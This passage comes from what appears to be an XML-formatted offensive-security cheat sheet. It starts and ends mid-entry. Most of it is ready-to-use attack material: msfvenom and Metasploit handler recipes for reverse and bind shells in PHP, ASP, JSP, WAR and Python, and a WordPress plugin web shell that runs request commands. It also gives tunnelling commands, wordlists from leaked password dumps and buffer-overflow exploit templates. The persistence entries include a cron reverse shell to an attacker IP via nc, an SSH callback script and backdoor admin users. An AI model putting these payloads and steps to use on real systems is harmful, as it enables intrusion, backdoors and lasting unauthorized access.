        set PAYLOAD php/meterpreter/bind_tcp_uuid
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Payload:
    msfvenom -a php --platform php -p php/meterpreter/bind_tcp_uuid LPORT=[listening port] -f raw -o [output].php</info>
        </option>
        <option name="Web (.php) - Bind Meterpreter on IPv6">
            <info>Build a bind meterpreter shell over ipv6 payload for PHP.
            
Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD php/meterpreter/bind_tcp_ipv6_uuid
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Payload:
    msfvenom -a php --platform php -p php/meterpreter/bind_tcp_ipv6_uuid LPORT=[listening port] -f raw -o [output].php</info>
        </option>
        <option name="Web (.php) - Weevely">
            <info>Build a Weevely shell for PHP.
                
Generate:
    weevely generate [password] [full-path output].php
    
Usage:
    weevely [url] [password]</info>
        </option>
        <option name="Web (.zip) - Wordpress Plugin">
            <info>Build a backdoor into a wordpress plugin.
                
Note: Need admin access to wordpress

1. Make shell.php:

    &lt;?php
    /*
     *     Plugin Name: shell
     *     Plugin URI: http://127.0.0.1
     *     Description: description
     *     Author: author
     *     Version: 1
     *     Author URI: http://127.0.0.1
     *                             */

    if(isset($_REQUEST['cmd'])){
        echo "&lt;pre&gt;";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "&lt;/pre&gt;";
        die;
    }

2. Compress shell.php into shell.zip:
    zip shell shell.php

After uploading:
    Execute shell by visiting [target]/wp-content/plugins/shell/shell.php</info>
        </option>
        <option name="Web (.asp) - Reverse Meterpreter">
            <info>Build a reverse meterpreter shell payload for ASP.

32 bit
-----------------------

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/meterpreter/reverse_tcp_uuid
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Paylod:
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp_uuid LHOST=[return ip] LPORT=[return port] -f asp -o [output].asp
        
        
64 bit
-----------------------

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/x64/meterpreter/reverse_tcp_uuid
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Payload:
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp_uuid LHOST=[return ip] LPORT=[return port] -f asp -o [output].asp</info>
        </option>
        <option name="Web (.asp) - Reverse Meterpreter over HTTP">
            <info>Build a reverse meterpreter over HTTP shell payload for ASP.
                
32 bit
-----------------------
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/meterpreter/reverse_tcp_http
        set LHOST [return ip]
        set LPORT [return port]
        run')
                
Build Paylod:
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp_http LHOST=[return ip] LPORT=[return port] -f asp -o [output].asp
                
                
64 bit
-----------------------
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/x64/meterpreter/reverse_tcp_http
        set LHOST [return ip]
        set LPORT [return port]
        run')
                
Build Payload:
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp_http LHOST=[return ip] LPORT=[return port] -f asp -o [output].asp</info>
        </option>
        <option name="Web (.asp) - Reverse Meterpreter over HTTPS">
            <info>Build a reverse meterpreter over HTTPS shell payload for ASP.
                
32 bit
-----------------------
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/meterpreter/reverse_tcp_https
        set LHOST [return ip]
        set LPORT [return port]
        run')
                
Build Paylod:
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp_https LHOST=[return ip] LPORT=[return port] -f asp -o [output].asp
                
                
64 bit
-----------------------
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/x64/meterpreter/reverse_tcp_https
        set LHOST [return ip]
        set LPORT [return port]
        run')
                
Build Payload:
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp_https LHOST=[return ip] LPORT=[return port] -f asp -o [output].asp</info>
        </option>
        <option name="Web (.asp) - Bind Meterpreter">
            <info>Build a bind meterpreter shell payload for ASP.
                
32 bit
-----------------------

Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/meterpreter/bind_tcp_uuid
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Payload:
    msfvenom -a x86 --platform windows -p windows/meterpreter/bind_tcp_uuid LPORT=[listening port] -f asp -o [output].asp
    
64 bit
-----------------------

Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/x64/meterpreter/bind_tcp_uuid
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Payload:
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/bind_tcp_uuid LPORT=[listening port] -f asp -o [output].asp</info>
        </option>
        <option name="Web (.asp) - Bind Meterpreter on IPv6">
            <info>Build a bind meterpreter over ipv6 shell payload for ASP.
                
32 bit
-----------------------
                
Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/meterpreter/bind_ipv6_tcp_uuid
        set LPORT [listening port]
        set RHOST [target ip]
        run')
                
Build Payload:
    msfvenom -a x86 --platform windows -p windows/meterpreter/bind_ipv6_tcp_uuid LPORT=[listening port] -f asp -o [output].asp
                
64 bit
-----------------------
                
Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/x64/meterpreter/bind_ipv6_tcp_uuid
        set LPORT [listening port]
        set RHOST [target ip]
        run')
                
Build Payload:
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/bind_ipv6_tcp_uuid LPORT=[listening port] -f asp -o [output].asp</info>
        </option>
        <option name="Web (.jsp) - Reverse Shell">
            <info>Build a reverse shell payload for JSP.
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD java/jsp_shell_reverse_tcp
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Payload:
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=[return ip] LPORT=[return port] -f raw -o [output].jsp</info>
        </option>
        <option name="Web (.jsp) - Bind Shell">
            <info>Build a bind shell payload for JSP.
                
Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD java/jsp_shell_bind_tcp
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Payload:
    msfvenom -p java/jsp_shell_bind_tcp LPORT=[listening port] -f raw -o [output].jsp</info>
        </option>
        <option name="Web (.war) - Reverse Shell">
            <info>Build a reverse shell payload for WAR.
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD java/jsp_shell_reverse_tcp
        set LHOST [return ip]
        set LPORT [return port]
        run')
                
Build Payload:
    msfvenom -p java/jsp_shell_reverse_tcp -f war -o [output].war</info>
        </option>
        <option name="Web (.war) - Bind Shell">
            <info>Build a bind shell payload for WAR.

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD java/jsp_shell_bind_tcp
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Payload:
    msfvenom -p java/jsp_shell_bind_tcp LPORT=[listening port] -f war -o [output].war</info>
        </option>
        <option name="Python - Reverse Meterpreter">
            <info>Build a reverse meterpreter shell payload for python.
            
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD python/meterpreter/reverse_tcp_uuid
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Payload:
    msfvenom -a python --platform python -p python/meterpreter/reverse_tcp_uuid LHOST=[return ip] LPORT=[return port] -f raw -o [output].py</info>
        </option>
        <option name="Python - Reverse Meterpreter over HTTP">
            <info>Build a reverse meterpreter over HTTP payload shell for python.
            
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD python/meterpreter/reverse_http
        set LHOST [return ip]
        set LPORT [return port]
        run')
            
Build Payload:
    msfvenom -a python --platform python -p python/meterpreter/reverse_http LHOST=[return ip] LPORT=[return port] -f raw -o [output].py</info>
        </option>
        <option name="Python - Reverse Meterpreter over HTTPS">
            <info>Build a reverse meterpreter shell over HTTPS payload shell for python.
            
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD python/meterpreter/reverse_https
        set LHOST [return ip]
        set LPORT [return port]
        run')
            
Build Payload:
    msfvenom -a python --platform python -p python/meterpreter/reverse_https LHOST=[return ip] LPORT=[return port] -f raw -o [output].py</info>
        </option>
        <option name="Python - Bind Meterpreter">
            <info>Build a bind meterpreter shell payload for python.
            
Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD python/meterpreter/bind_tcp_uuid
        set LPORT [listening port]
        set RHOST [target ip]
        run')
            
Build Payload:
    msfvenom -a python --platform python -p python/meterpreter/bind_tcp_uuid LPORT=[listening port] -f raw -o [output].py</info>
        </option>
    </area>
    <area name="Tunnel">
        <option name="Port Forward - Windows">
            <info>Forward traffic to another host on Windows.
            
Usage:
    netsh interface portproxy add v4tov4 listenport=[listening port] listenaddress=[attacker IP address] connectport=[forward port] connectaddress=[forward IP address]
(or)
    * upload /usr/share/windows-binaries/
    
Cleanup:
    netsh interface portproxy delete v4tov4 listenport=[listening port] listenaddress=[attacker IP address]</info>
            
        </option>
        <option name="Port Forward - Linux">
            <info>Forward traffic to another host on Linux.
            
Usage:
    sysctl -w net.ipv4.ip_forward=1
    iptables -t nat -A PREROUTING -p tcp --dport [listening port] -j REDIRECT --to-destination [destination ip] --to-port [destination port]
    
Cleanup:
    sysctl -w net.ipv4.ip_forward=0
    iptables -t nat -F</info>
        </option>
        <option name="Port Forward - Mac">
            <info>Forward traffic to another host on Mac.
                
Usage:
    echo "
    rdr pass inet proto tcp from any to any port [listening port] -&gt; [destination ip] port [destination port]
    " | sudo pfctl -ef -
    
Cleanup:
    sudo pfctl -F all -f /etc/pf.conf</info>
        </option>
        <option name="Port Forward - Meterpreter">
            <info>Build a tunnel inside a meterpreter session from localhost to a remote host on the target host.
     
      _____       /        _____       _____
     |     |     /        |     |     |     |
     |  A  | ===( F |===&gt; |  B  | --&gt; |  C  |
     |_____|     \        |_____|     |_____|
      /___\       \        /___\       /___\
                        Meterpreter
     
Usage:
    meterpreter &gt; portfwd add -l [A listening port] -p [C port] -r [C host]

Proxy:
    127.0.0.1:[A listening port]
    
Cleanup:
    meterpreter &gt; portfwd delete -l [A listening port] -p [C port] -r [C host]</info>
        </option>
        <option name="Host Forward - Metasploit">
            <info>Forward traffic through a compromised host using Metasploit.

Usage:
    route add [destination subnet] [destination netmask] [session number]

Example Context (Compromised Host, multi-homed):
    IP Address  :   192.168.0.9
    Subnet      :   192.168.0.1
    Netmask     :   255.255.255.0
    
    IP Address  :   192.168.1.131
    Subnet      :   192.168.1.1
    Netmask     :   255.255.255.0    

Example:
    (metasploit session 1 to 192.168.0.9)
    route add 192.168.1.1 255.255.255.0 1

Cleanup:
    route remove [destination subnet] [destination netmask] [session number]</info>
        </option>
        <option name="Tunnel - SSH">
            <info>Route traffic through an SSH server.
     _____                     _____
    |     |         ||        |     |
    |  A  |===\ - -&gt;||    /==&gt;|  B  |
    |_____|  ||     ||    ||  |_____|
     /___\   ||     ||    ||   /___\
             ||    _____  ||
             \===>|     |==/
                  |  C  |
                  |_____|
                   /___\
                    SSH
On A:
    Socks:
        ssh -N -D [A open port] [C user]@[C ip]
        (proxychains) -&gt; http://127.0.0.1:[A open port]
    
    Single Port:
        ssh -N -L [A open port]:[B ip]:[B port] [C user]@[C ip]
        nc -n 127.0.0.1 [A open port]</info>
        </option>
        <option name="Tunnel - SSH Reverse">
            <info>Expose an internal network to an external viewer by forwarding traffic through an SSH tunnel.
                
     _____       /        _____       _____
    |     |     /        |     |     |     |
    |  A  | ===( F |===&gt; |  B  | --&gt; |  C  |
    |_____|     \        |_____|     |_____|
     /___\       \        /___\       /___\
                           SSH
       
On B:
    ssh -N -R [B port]:[C ip]:[C port] [A user]:[A ip]
(or, using plink on Windows)
    * upload /usr/share/windows-binaries/plink.exe
    plink -l [A user] -pw [A pass] -R [B port]:[C ip]:[C port] [A ip]

Examples:
-----------------------

Simple SSH from A to B
    (on B) ssh -N -R 9999:127.0.0.1:22 [A user]:[A ip]
    (on A) ssh 127.0.0.1 -p 9999
    
Access port 21 on C from A through B
    (on B) ssh -N -R 21:[C ip]:21 [A user]:[A ip]
    (on A) ftp 127.0.0.1</info>
        </option>
        <option name="Tunnel - HTTP">
            <info>Activate an HTTP service on a machine and use it as a proxy server.
     _____                      _____
    |     |          |         |     |
    |  A  |===\-----&gt;|     /===|  B  |
    |_____|   ||     |     ||  |_____|
     /___\    ||     |     ||
             _||___     ___||_
            | ||_  |   |  _|| |
       HTTP | |__| |===| |__| |
            |______|   |_____ |
            
     
On Server:
    Windows:
        (upload) /usr/share/http-tunnel/exe/httptunnel_server.cfg
        (upload) /usr/share/http-tunnel/exe/httptunnel_server.exe
        (execute) /usr/share/http-tunnel/exe/httptunnel_server.exe
    
    Linux (perl):
        (upload) /usr/share/http-tunnel/perl/httptunnel_server.cfg
        (upload) /usr/share/http-tunnel/perl/httptunnel_server.pl
        (execute) /usr/share/http-tunnel/perl/httptunnel_server.pl
    
Locally:
    httptunnel_client --SERVER=[server ip] --debug

Use proxy:
    (Socks5) http://127.0.0.1:1080
    
Admin Console:
    (browse to) http://127.0.0.1:1079
    
Remote Desktop:
    rdesktop 127.0.0.1:3000
            </info>
        </option>
        <option name="Tunnel - ICMP">
            <info>Tunnel TCP traffic through ICMP ping requests and responses.

Source Code:
    http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz
    
Install (Debian):
    (add to /etc/apt/sources.list):
        deb http://www.cti.ecp.fr/~beauxir5/debian binary/
        deb-src http://www.cti.ecp.fr/~beauxir5/debian source/
    apt-get update
    apt-get install ptunnel
    
Server:
    ptunnel (-setuid proxy -setgid proxy -x [password])
    
Client:
    ptunnel -p [server ip] -lp [local listening port] -da [destination ip] -dp [destination port] (-setuid proxy -setgid proxy -x [password])</info>
        </option>
        <option name="Tunnel - DNS">
            <info>Tunnel TCP traffic through DNS traffic.
           
Source Code:
    http://code.kryo.se/iodine/
           
Server:
    iodined -fu iodine -P [password] [separate-subnet ip 1] [domain name]
    
Client:
    iodine -fu iodine -P [password] [dns ip] [domain name]</info>
        </option>
    </area>
    <area name="Wordlist">
        <option name="Local Wordlists">
            <info>Check to see if your linux distro contains any built in wordlists.
            
Method:
    1) Search directory structure for folders named 'wordlists' (depth - 3)
    
echo "Directories to Check:\n\n";for line in $(locate wordlists);do if [ -d $line ];then echo $line;fi;done;echo "\n\nWordlists Found:\n\n";for l1 in $(locate wordlists);do if [ -f $l1 ];then echo "$(wc -l $l1)";elif [ -d $l1 ];then for l2 in $(ls $l1);do if [ -f $l1/$l2 ];then echo "$(wc -l $l1/$l2)";elif [ -d $l1/$l2 ];then for l3 in $(ls $l1/$l2);do if [ -f $l1/$l2/$l3 ];then echo "$(wc -l $l1/$l2/$l3)";fi;done;fi;done;fi;done;</info>
        </option> 
        <option name="Download Wordlists">
            <info>Download wordlists from real password leaks.
            
RockYou (already in Kali)
    - Compromised in 2009 from a social game and advertising website, good starting point.

Crackstation-human-only :: 684 MB (247 MB)
    - Real human passwords leaked from various website databases.
    
Crackstation-Full :: 15 GB (4.2 GB)
    - Full crackstation passwords leaked from various website databases.
    
m3g9tr0n_Passwords_WordList_CLEANED
    - Top ten million passwords from all recent password dumps
    
Wick2o's Password List from Dump Monitor
    - Wick2o monitors leaks on pastebin and similar sites
    
Other places to try:
    https://blog.g0tmi1k.com/2011/06/dictionaries-wordlists
    https://github.com/danielmiessler/SecLists/tree/master/Passwords
    https://archive.org/details/pastebinpastes
    https://wiki.skullsecurity.org/Passwords
    http://www.leakedin.com/tag/emailpassword-dump/
    https://www.reddit.com/domain/pastie.org/search?q=password+leak&amp;sort=relevance&amp;t=month
    Scraping all pastebin/pastie/... sites
    
* Credit to Peter Kim in The Hacker Playbook 2</info>
            
        </option>
        <option name="Create Custom Wordlist">
            <info>Populate possible passwords from relevant information using various techniques.

-----------------------
Populate words (mask)
-----------------------

Usage:
    maskprocessor [mask]
    
Determine size of output:
    ... --combinations

Built-in Character Sets:
    ?l = abcdefghijklmnopqrstuvwxyz
    ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
    ?d = 0123456789
    ?s =  !"#$%&amp;'()*+,-./:;&lt;=&gt;?@[]^_`{|}~
    ?a = ?l?u?d?s

Custom Character Sets
    -1
    -2
    -3
    -4

Example: Every Birthday Year
    maskprocessor 19?d?d &amp;&amp; maskprocessor -1 01 20?1?d


-------------------------------------------
Populate statistical combinations (Markov)
-------------------------------------------

Usage:
    statsprocessor --pw-min=[minLength] --pw-max=[maxLength] /usr/share/statsprocessor/hashcat.hcstat [mask]

Determine size of output:
    ... --combinations
    
Example: Top 100 number combinations
    statsprocessor --pw-min=1 --pw-max=4 /usr/share/statsprocessor/hashcat.hcstat ?d?d?d?d | head -100


-----------------------
Permutation         :: [ABC] -&gt; ACB,BAC...
-----------------------

Usage:
    hashcat -a 4 --stdout [wordlist]
    
    
-----------------------
Combination         :: [A,B,C] -&gt; AB,BA,BC...
-----------------------

Usage:
    hashcat -a 8 --stdout [wordlist] --elem-cnt-max=[max item count]

-----------------------
Substitute / Toggle :: [A] -&gt; A,a,4...
-----------------------

Usage:
    hashcat -a 5 --stdout --table-file /usr/share/hashcat/tables/toggle_case_and_leet.table [wordlist]
    
* Recommendation: leave substitution and toggle out of wordlist, let rules handle it during execution (GPU usage)</info>
            
        </option>
        <option name="Filter list by requirements">
            <info>Filter a wordlist to list only those that meet certain requirements.
                
Usage:
    pw-inspector -i [input] (-o [output]) -m [min length] -M [max length] [contains sets...]
    
Sets:
    -l      lowcase characters (a,b,c,d, etc.)
    -u      upcase characters (A,B,C,D, etc.)
    -n      numbers (1,2,3,4, etc.)
    -p      printable characters (which are not -l/-n/-p, e.g. $,!,/,(,*, etc.)
    -s      special characters - all others not withint the sets above</info>
            
        </option>
    </area>
	<area name="Reverse Engineering">
		<option name="Disassemble Shellcode">
			<info>Disassemble a hex string (shellcode) into assembly.
				
echo -ne '\x41\x41\x41\x41' > shellcode.txt
ndisasm -b32 shellcode.txt > assembly.txt</info>
		</option>
	</area>
    <area name="Buffer Overflow">
        <option name="Bad Characters">
            <info>List of characters used to check for bad characters.

"\x00"
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</info>
        </option>
        <option name="OP-Code Generation">
            <info>Registers don't always point to a convenient location, and expanding the payload to accomodate register locations might mess up the crash.  To fix this, you can include op-codes in your payload to alter the location of registry locations.
                
Usage:
    ruby /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
    nasm &gt; [operation]
        00000000    [op-code]   [operation]

Common Operations:
    ADD EAX,12
    JMP EAX
    
Example:
    ruby /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
    nasm &gt; add eax,12
        00000000    83C00C      add eax,byte +0xc
    nasm &gt; jmp eax
        00000000    FFE0        jmp eax
    ...
    adding "\x83\xC0\x0C\xFF\xE0" now changes the location of EAX then jumps to it.
    
* provided that none of the op-code characters are badchars</info>
        </option>
        <option name="Script - Fuzzing">
            <info>Build a script to fuzz a service.

fuzz.py
===========================================================
#!/usr/bin/python
import socket, sys
            
def usage():
    print ("Usage: %s &lt;target&gt; &lt;port&gt;" % sys.argv[0])
                
def fuzz(target,port):
    str="A"
    diff=200
    count=1
    while count&lt;30:
        print ("[+] Fuzzing with %s*%i" % (str,(count*diff)))
        buffer=str*(diff*count)
        count+=1
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            c=s.connect((target,int(port)))
            s.recv(1024)
            s.send("USER anonymous\r\n")
            s.recv(1024)
            s.send("PASS anonymous@domain.com\r\n")
            s.recv(1024)
            s.send("[CMD] %s\r\n" % buffer)
            s.close()
        except:
            print ("[-] Failed to connect")
            sys.exit(1)
                    
if len(sys.argv) &lt;&gt; 3:
    usage()
    sys.exit(1)
else:
    fuzz(sys.argv[1],sys.argv[2])
    sys.exit(0)
===========================================================</info>
        </option>
        <option name="Script - Exploit">
            <info>Build a script to exploit a buffer overflow.

exploit.py
===========================================================
#!/usr/bin/python
import socket, sys
                
def usage():
    print ("Usage: %s &lt;target&gt; &lt;port&gt;" % sys.argv[0])
                    
def exploit(target,port,buffer):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        c=s.connect((target,int(port)))
        s.recv(1024)
        s.send("USER anonymous\r\n")
        s.recv(1024)
        s.send("PASS anonymous@domain.com\r\n")
        s.recv(1024)
        s.send("[CMD] %s\r\n" % buffer)
        s.close()
    except:
        print ("[-] Failed to connect")
        sys.exit(1)
                    
def buff_fuzz(length):
    return "A"*length
                    
def buff_pattern():
    return "[PATTERN]"
                    
def buff_badchar(offset):
    badchar=("[BADCHAR]")
    return "A"*offset + "B"*4 + badchar
                    
def buff_exploit(offset,start):
    shellcode=("[SHELLCODE]")
    return "A"*offset + start + "\x90"*20 + shellcode
                    
if len(sys.argv) &lt;&gt; 3:
    usage()
    sys.exit(1)
else:
    exploit(sys.argv[1],sys.argv[2],buff_fuzz(2700))
    sys.exit(0)
===========================================================</info>
        </option>
        <option name="Stack Overflow - Windows (32 bit)">
            <info>Build a stack buffer overflow exploit for a 32bit Windows program.
                
0: Setup
    - Duplicate and run program on local Windows system
    - Open Immunity Debugger and attach program process
                
1: Fuzz =&gt; Find LENGTH of buffer necessary to overwrite EIP and cause a crash
    - ./fuzz.py [target] [port]
    
    :: Buffer = "A"*LENGTH ::

2: Pattern =&gt; Find exact OFFSET in buffer containing EIP
    - /usr/share/metasploit-framework/tools/exploit/pattern_create.rb [length]
    - ./exploit.py [target] [port]
    - /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb [overwritten EIP value]
    
    :: Buffer = "A"*OFFSET + "B"*4 ::

3: Register =&gt; Identify a REGISTER that points to overwritable space (e.g. ESP)
    - {right-click + follow-in-dump} to check location
    
4: Bad Characters =&gt; Overwrite identified register space with BADCHARS while also triggering crash
    - Identify bad characters as the first character to be missing each iteration
    
    :: Buffer = "A"*OFFSET + "B"*4 + "C"[to REGISTER] + BADCHARS ::
        (or)
    :: Buffer = "A"[to REGISTER] + BADCHARS + "A"[to OFFSET] + "B"*4 ::

5: Shellcode =&gt; Produce SHELLCODE (BADCHARS = "\x00\x0a\x0d")
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp_uuid LHOST=[return ip] LPORT=[return port] EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f c

6: Return Address =&gt; Find JMP [Register] ADDRESS
    - Find OPCODE for command
        kali:/# ruby /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
        nasm &gt; JMP ESP
            00000000 FFE4 command =&gt; OPCODE = \xff\xe4
    - In Immunity Debugger, type "!mona modules" =&gt; identify MODULE (.dll) with:
        o No bad characters in address
        o No memory protection mechanisms
    - In Immunity Debugger, type "!mona find -s '[OPCODE]' -m [MODULE]" =&gt; identify ADDRESS with:
        o No bad characters
        
7. Run Exploit

    :: Buffer = "A"*OFFSET + ADDRESS + "C"[to REGISTER] + "\x90"*20 + SHELLCODE ::
        (or)
    :: Buffer = "A"[to REGISTER] + "\x90"*20 + SHELLCODE + "A"[to OFFSET] + ADDRESS ::</info>
        </option>
        <option name="Stack Overflow - Linux (32 bit)">
            <info>Build a stack buffer overflow exploit for a 32bit Linux program.
                
0: Setup
    - Duplicate program on local Linux system
    - Run program through debugger: edb --run [program]
    
1: Fuzz =&gt; Find LENGTH of buffer necessary to overwrite EIP and cause a crash
    - ./fuss.py [target] [port]
    
    :: Buffer = "A"*LENGTH ::
    
2: Pattern =&gt; Find exact OFFSET in buffer containing EIP
    - /usr/share/metasploit-framework/tools/exploit/pattern_create.rb [length]
    - ./exploit.py [target] [port]
    - /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb [overwritten EIP value]
    
    :: Buffer = "A"*OFFSET + "B"*4 ::
    
3: Register =&gt; Identify a REGISTER that points to overwritable space (e.g. ESP)
    - {right-click + follow-in-dump} to check location
    
4: Bad Characters =&gt; Overwrite identified register space with BADCHARS while also triggering crash
    - Identify bad characters as the first character to be missing each iteration
    
    :: Buffer = "A"*OFFSET + "B"*4 + "C"[to REGISTER] + BADCHARS ::
        (or)
    :: Buffer = "A"[to REGISTER] + BADCHARS + "A"[to OFFSET] + "B"*4 ::
    
5: Shellcode =&gt; Produce SHELLCODE (BADCHARS = "\x00\x0a\x0d")
    msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp_uuid LHOST=[return ip] LPORT=[return port] -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f c

6: Return Address =&gt; Find JMP [Register] ADDRESS
    - In edb, use Plugins-&gt;OpcodeSearcher-&gt;Opcode Search
    - Select "[REGISTER] -&gt; EIP" from dropdown menu
    - Select program binary from table
    - Click "Find", then use an address without badchars
    
7: Run Exploit

    :: Buffer = "A"*OFFSET + ADDRESS + "C"[to Register] + "\x90"*20 + SHELLCODE ::
        (or)
    :: Buffer = "A"[to REGISTER] + "\x90"*20 + SHELLCODE + "A"[to OFFSET]" + ADDRESS ::</info>
        </option>
    </area>
    <area name="Persistence - Linux">
        <option name="Add User">
            <info>Add a user on a Linux system.
                
Usage:
    useradd -M [user]
    passwd [user]
    &gt; [password]
    
(add to sudo group)
    usermod -aG sudo [user]</info>
        </option>
        <option name="Scheduled Reverse Shell">
            <info>Set up a reverse shell to callback every X minutes.

Usage (every 10 minutes):
    crontab -e
    0-59/10 * * * * nc [attacker ip] [attacker port] -e /bin/bash</info>
        </option>
        <option name="Scheduled Payload">
            <info>Set up a payload to execute very X minutes.
                
Usage (every 10 minutes):
    crontab -e
    0-59/10 * * * * [path]/[payload]</info>
        </option>
        <option name="Scheduled SSH Callback">
            <info>Set up a script in crontab to callback every X minutes.  Note: should connect to *unprivileged* user on attacker machine.
            
1) Build RSA key-pair on target.
    ssh-keygen -t rsa
        -&gt; copy public key to /home/[attacker unprivileged user]/.ssh/authorized_keys on attacker machine
    
2) Create callback.sh
        #!/bin/sh
        # Callback script located on callback source computer (target)
        killall ssh >/dev/null 2&gt;&amp;1
        sleep 5
        REMLIS=[attacker port]
        REMUSR=[attacker unprivileged user]
        HOSTS="[attacker ip]"
        for LIVEHOST in $HOSTS;
        do
            COUNT=$(ping -c2 $LIVEHOST | grep 'received' | awk -F',' '{ print $2 }' | awk '{ print $1 }')
            if [[ $COUNT -gt 0 ]]; then
                ssh -R ${REMLIS}:localhost:22 -i "/home/${REMUSR}/.ssh/id_rsa" -N ${LIVEHOST} -l ${REMUSR}
            fi
        done
        
    * don't forget to 'chmod +x callback.sh'
        
3) Add script to crontab (every 10 minutes)
    crontab -e
    0-59/10 * * * * [path]/callback.sh</info>
        </option>
        <option name="Startup Service">
            <info>Configure a service to run at startup.
                
Usage:
    (add script to /etc/init.d/)
    update-rc.d [script] defaults
    
Cleanup:
    update-rc.d -f [script] remove</info>
        </option>
    </area>
    <area name="Persistence - Windows">
        <option name="Add User">
            <info>Add a user on a Windows system.
                
Usage:
    net user [user] [password] /add

(add to administrators)
    net localgroup "Administrators" [user] /add
    
(add to remote destkop users)
    net localgroup "Remote Desktop Users" [user] /add</info>
        </option>
        <option name="Add Domain User">
            <info>Add a domain user on a Windows system.
                
Usage:
    net user [user] [password] /add /domain
    
(add to domain administrators)
    net group "Domain Admins" [user] /add /domain</info>
        </option>
        <option name="Scheduled Reverse Shell">
            <info>Schedule a task to automatically hit a web address hosting a payload.
            
Usage:
    SCHTASKS /CREATE /TN [task name] /TR
